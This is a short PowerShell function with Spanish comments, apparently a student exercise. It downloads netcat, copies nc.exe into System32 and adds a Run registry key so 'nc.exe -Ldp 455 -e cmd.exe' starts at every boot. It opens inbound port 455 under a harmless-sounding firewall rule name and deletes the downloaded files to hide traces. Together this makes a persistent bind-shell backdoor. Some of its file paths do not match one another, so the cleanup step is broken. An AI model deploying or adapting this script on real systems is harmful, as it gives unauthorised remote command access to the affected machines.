function DescargarYDescomprimirNetcat {
    # Obtiene el nombre de usuario actual
    $usuarioActual = $env:USERNAME

    # COMANDO DE DESCARGA: Descargar y descomprimir el archivo ZIP
    $zipFilePath = "C:\Users\$usuarioActual\Downloads\netcat-win32-1.11.zip"
    $destinationPath = "C:\Users\$usuarioActual\Downloads\netcat-1.11"

    # Descargar el archivo ZIP
    Invoke-WebRequest -Uri "URL_DEL_ARCHIVO_ZIP" -OutFile $zipFilePath

    # Descomprimir el archivo ZIP
    Expand-Archive -Path $zipFilePath -DestinationPath $destinationPath

    # UNZIP DEL NC.EXE EN SYSTEM32: Mover el archivo nc.exe a la carpeta System32
    $ncFilePath = "C:\Users\daw1xx\Downloads\netcat-win32-1.11\nc.exe"
    $system32Path = "C:\Windows\System32"

    # Mover nc.exe a la carpeta System32
    Move-Item -Path $ncFilePath -Destination $system32Path

    # ARRANQUE AL INICIO DEL SISTEMA
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nc /d "C:\Windows\System32\nc.exe -Ldp 455 -e cmd.exe" /t REG_SZ /f

    # //ACTIVAR PERSIMOS DE FIREWALL
    netsh advfirewall firewall add rule name="Service Firewall" dir=in action=allow protocol=TCP localport=455 enable=yes

    # BORRAR EL ZIP Y LA CARPETA
    Remove-Item -Path $ncFilePath -Force
    Remove-Item -Path $zipFilePath -Force
}
